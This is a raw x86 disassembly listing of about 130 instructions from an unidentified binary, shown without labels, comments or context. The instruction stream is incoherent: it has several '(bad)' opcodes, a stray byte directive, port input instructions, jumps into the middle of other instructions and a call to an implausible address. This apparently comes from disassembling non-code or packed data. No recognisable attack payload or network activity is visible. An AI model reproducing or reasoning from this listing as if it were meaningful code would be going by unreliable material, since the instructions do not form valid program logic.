  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
